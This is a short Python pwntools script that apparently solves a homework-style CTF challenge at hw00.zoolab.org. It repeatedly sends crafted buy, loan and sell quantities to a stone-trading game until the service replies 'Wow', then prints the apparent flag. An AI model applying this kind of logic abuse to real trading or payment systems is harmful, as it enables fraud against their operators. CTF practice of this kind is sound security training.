from pwn import *

host = 'hw00.zoolab.org'
port = 65535

def sendValue(s, value):
    s.recvuntil('How many Aquamarine stones do you want to buy/loan (positive) or sell (negative)?\n')
    s.recvline()
    s.sendline(value)

def exploit(s):
    buyOrload = [100000000, -3000000, -97000000]
    while True:
        for i in buyOrload:
            sendValue(s, str(i))
        if b'Wow' in s.recvline():
            break
    print (s.recvline()[30:-1])

if __name__ == "__main__":
    s = remote(host, port)
    exploit(s)
    s.close()